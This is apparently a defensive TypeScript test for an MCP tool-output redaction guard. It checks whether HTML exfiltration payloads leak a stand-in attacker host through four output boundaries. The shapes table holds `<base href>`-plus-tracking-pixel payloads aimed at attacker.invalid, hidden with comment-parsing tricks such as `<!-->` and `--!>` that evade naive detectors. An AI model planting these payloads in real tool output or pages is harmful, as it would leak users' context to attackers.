// T62 — the inert-span bypasses at the REAL public boundaries, not at
// `detectExfil` (a pure function a call-site fix could not be observed at, and
// a call-site defect could hide behind).
//
//   - dispatchCallTool            (MCP transport)
//   - prepareOutputForPersistence (durable-sink materializer)
//   - validateOutputForTransport  (the function the redact seam calls)
//   - redactToolOutput            (MCP compatibility seam)
//
// Advisory redaction is OFF, so what is measured is the MANDATORY floor — the
// same configuration T42/T53 used.
// Read-only, synthetic hosts only.
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";

const out = (row: Record<string, unknown>) => process.stdout.write(`${JSON.stringify(row)}\n`);

const ATT = "attacker.invalid";
const CDN = "cdn.example.org";

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

const shapes: Record<string, { text: string; hostile: boolean; note: string }> = {
  // Adjudicated LIVE by lol-html (an independent HTML tokenizer):
  abruptEmptyComment: {
    text: `<!--><base href="https://${ATT}/x/"><img src="pixel.png?ctx=CTX">-->`,
    hostile: true,
    note: "<!--> is an abrupt-closing-of-empty-comment; the base after it is live",
  },
  abruptDashComment: {
    text: `<!---><base href="https://${ATT}/x/"><img src="pixel.png">-->`,
    hostile: true,
    note: "<!---> closes in comment-start-dash state",
  },
  commentEndBang: {
    text: `<!-- n --!><base href="https://${ATT}/x/"><img src="pixel.png"> -->`,
    hostile: true,
    note: "--!> closes the comment (comment-end-bang state)",
  },
  fencePairSwallowsLiveBase: {
    text: "<!--\n```\n-->\n\n<base href=\"https://" + ATT + "/x/\">\n\n```\n",
    hostile: true,
    note: "two fence markers quoted inside/after a comment pair into a span over a live base",
  },
  // Controls that must still be caught / still be quiet:
  plainHostileBase: {
    text: `<base href="https://${ATT}/x/"><img src="pixel.png">`,
    hostile: true,
    note: "control: plain hostile base",
  },
  unterminatedComment: {
    text: `<!-- oops <base href="https://${ATT}/x/">`,
    hostile: true,
    note: "control: unterminated comment must stay eager",
  },
  ctlCdnBaseInComment: {
    text: `<!-- <base href="https://${CDN}/docs/"> -->`,
    hostile: false,
    note: "control: T63's benign suppression target",
  },
  ctlCdnBaseInFence: {
    text: "```html\n<base href=\"https://" + CDN + "/docs/\">\n```\n",
    hostile: false,
    note: "control: T63's other benign suppression target",
  },
};

const cwd = process.cwd();

const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }),
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(shapes).map(([name, shape]) => ({
    name: `p.${name}`,
    module: "standard" as const,
    description: name,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: shape.text }),
  })),
};

const leaking: string[] = [];
for (const [name, shape] of Object.entries(shapes)) {
  const serialized = JSON.stringify({ note: shape.text });

  const persist = prepareOutputForPersistence(pass, serialized);
  const persistLeaks = persist.allowed ? persist.content.includes(ATT) : false;

  const trans = validateOutputForTransport({ value: { note: shape.text }, format: "json" });
  const transLeaks = trans.text.includes(ATT);

  const seamText = await redactToolOutput(cwd, serialized);
  const seamLeaks = seamText.includes(ATT);

  const mcpResult = await dispatchCallTool(ctx, `p.${name}`, {});
  const mcpLeaks = JSON.stringify(mcpResult).includes(ATT);

  const anyLeak = persistLeaks || transLeaks || seamLeaks || mcpLeaks;
  if (shape.hostile && anyLeak) leaking.push(name);

  out({
    name,
    hostile: shape.hostile,
    note: shape.note,
    mcpState: (mcpResult as { redaction?: { state?: string } }).redaction?.state ?? null,
    mcpReasons: (mcpResult as { redaction?: { reasons?: string[] } }).redaction?.reasons ?? null,
    persistState: persist.allowed ? persist.redaction.state : "blocked",
    persistReasons: persist.allowed ? persist.redaction.reasons : null,
    transportState: trans.redaction.state,
    leaksHost: { mcp: mcpLeaks, persist: persistLeaks, transport: transLeaks, seam: seamLeaks },
    benignByteIdentical: shape.hostile ? null : seamText === serialized,
  });
}

out({ label: "SUMMARY", hostileLeakingAtAnyBoundary: leaking.length, ids: leaking });
